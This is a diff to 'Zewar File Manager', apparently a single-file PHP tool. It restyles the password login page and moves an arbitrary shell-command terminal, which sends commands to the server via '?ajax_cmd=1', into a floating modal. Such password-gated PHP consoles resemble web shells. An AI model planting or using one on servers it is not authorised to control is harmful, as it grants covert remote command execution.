     document.body.appendChild(toast);
     setTimeout(function() { toast.remove(); }, 3000);
 }
@@ -1045,6 +1327,63 @@ function showModal(id) {
 
 function closeModal(id) {
     document.getElementById(id).classList.remove('active');
+}
+
+function openCmdModal() {
+    document.getElementById('cmdOverlay').classList.add('active');
+    document.getElementById('cmdModal').classList.add('active');
+    document.getElementById('cmd_command').focus();
+}
+
+function closeCmdModal() {
+    document.getElementById('cmdOverlay').classList.remove('active');
+    document.getElementById('cmdModal').classList.remove('active');
+}
+
+function clearCmdOutput() {
+    document.getElementById('cmd_output_floating').innerHTML = '<i class="fas fa-info-circle"></i> Terminal cleared!<br>Type your command and press Enter.';
+}
+
+function executeCommandFloating() {
+    const cmdInput = document.getElementById('cmd_command');
+    const cmdOutput = document.getElementById('cmd_output_floating');
+    const command = cmdInput.value.trim();
+    
+    if (!command) {
+        showToast('Please enter a command', 'error');
+        return;
+    }
+    
+    cmdOutput.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Executing command...';
+    
+    fetch(`?ajax_cmd=1&t=${Date.now()}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `csrf_token=<?php echo csrf_token(); ?>&command=${encodeURIComponent(command)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            cmdOutput.innerHTML = `<i class="fas fa-dollar-sign" style="color:#4caf50;"></i> <span style="color:#ffd700;">$ ${escapeHtml(command)}</span>\n\n${escapeHtml(data.output || '✓ Command executed successfully')}`;
+            cmdInput.value = '';
+            showToast('Command executed', 'success');
+        } else {
+            cmdOutput.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#dc3545;"></i> Error:\n\n${escapeHtml(data.output)}`;
+            showToast('Command failed', 'error');
+        }
+    })
+    .catch(error => {
+        cmdOutput.innerHTML = `<i class="fas fa-bug" style="color:#dc3545;"></i> Request failed:\n\n${error.message}`;
+        showToast('Request failed', 'error');
+    });
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
 }
 
 function editFile(encodedName) {
@@ -1075,54 +1414,23 @@ function deleteItem(name) {
     showModal('deleteModal');
 }
 
-function executeCommand() {
-    var cmdInput = document.getElementById('cmd_input');
-    var cmdOutput = document.getElementById('cmd_output');
-    var command = cmdInput.value.trim();
-    
-    if (!command) {
-        showToast('Please enter a command', 'error');
-        return;
-    }
-    
-    cmdOutput.innerHTML = 'Executing command...';
-    cmdOutput.classList.add('active');
-    
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', '?ajax_cmd=1&t=' + Date.now(), true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-                try {
-                    var data = JSON.parse(xhr.responseText);
-                    if (data.status === 'success') {
-                        cmdOutput.innerHTML = '$ ' + command + '\n' + (data.output || 'Command executed successfully');
-                        cmdInput.value = '';
-                        showToast('Command executed', 'success');
-                    } else {
-                        cmdOutput.innerHTML = 'Error: ' + data.output;
-                        showToast('Command failed', 'error');
-                    }
-                } catch(e) {
-                    cmdOutput.innerHTML = 'Error parsing response';
-                    showToast('Error parsing response', 'error');
-                }
-            } else {
-                cmdOutput.innerHTML = 'Request failed: ' + xhr.status;
-                showToast('Request failed', 'error');
-            }
-        }
-    };
-    xhr.send('csrf_token=<?php echo csrf_token(); ?>&command=' + encodeURIComponent(command));
-}
-
+// Close modal on outside click
 document.querySelectorAll('.modal').forEach(function(modal) {
     modal.addEventListener('click', function(e) {
         if (e.target === this) {
             this.classList.remove('active');
         }
     });
+});
+
+// Close CMD modal with ESC key
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        closeCmdModal();
+        document.querySelectorAll('.modal.active').forEach(function(modal) {
+            modal.classList.remove('active');
+        });
+    }
 });
 
 <?php if ($message): ?>
@@ -1142,6 +1450,7 @@ function get_login_page($error = '') {
     <head>
         <meta charset="UTF-8">
         <title>Zewar File Manager - Login</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
@@ -1160,6 +1469,11 @@ function get_login_page($error = '') {
                 padding: 40px;
                 width: 100%;
                 max-width: 400px;
+                animation: fadeIn 0.5s ease;
+            }
+            @keyframes fadeIn {
+                from { opacity: 0; transform: translateY(-20px); }
+                to { opacity: 1; transform: translateY(0); }
             }
             .logo { text-align: center; margin-bottom: 30px; }
             .logo h1 { font-size: 2rem; color: #ffd700; }
@@ -1174,8 +1488,9 @@ function get_login_page($error = '') {
                 border-radius: 5px;
                 color: #fff;
                 font-size: 1rem;
+                transition: all 0.3s;
             }
-            .input-group input:focus { outline: none; border-color: #ffed4a; }
+            .input-group input:focus { outline: none; border-color: #ffed4a; box-shadow: 0 0 10px rgba(255,215,0,0.3); }
             .btn-login {
                 width: 100%;
                 padding: 12px;
@@ -1186,8 +1501,9 @@ function get_login_page($error = '') {
                 font-weight: 600;
                 font-size: 1rem;
                 cursor: pointer;
+                transition: all 0.3s;
             }
-            .btn-login:hover { background: #ffed4a; }
+            .btn-login:hover { background: #ffed4a; transform: translateY(-2px); }
             .error {
                 background: rgba(220,53,69,0.2);
                 border-left: 4px solid #dc3545;
@@ -1203,19 +1519,20 @@ function get_login_page($error = '') {
     <body>
         <div class="login-container">
             <div class="logo">
-                <h1>📁 Zewar File Manager</h1>
+                <i class="fas fa-folder-open" style="font-size: 3rem; color: #ffd700;"></i>
+                <h1>Zewar File Manager</h1>
                 <p>Secure Access Required</p>
             </div>
-            ' . ($error ? '<div class="error">⚠ ' . htmlspecialchars($error) . '</div>' : '') . '
+            ' . ($error ? '<div class="error"><i class="fas fa-exclamation-triangle"></i> ' . htmlspecialchars($error) . '</div>' : '') . '
             <form method="post">
                 <input type="hidden" name="csrf_token" value="' . $csrf . '">
                 <div class="input-group">
-                    <label>🔒 Password</label>
+                    <label><i class="fas fa-lock"></i> Password</label>
                     <input type="password" name="password" placeholder="Enter password" autofocus required>
                 </div>
-                <button type="submit" class="btn-login">🔐 Login</button>
+                <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt"></i> Login</button>
             </form>
-            <div class="footer">🛡 Secure Connection</div>
+            <div class="footer"><i class="fas fa-shield-alt"></i> Secure Connection</div>
         </div>
     </body>
     </html>';
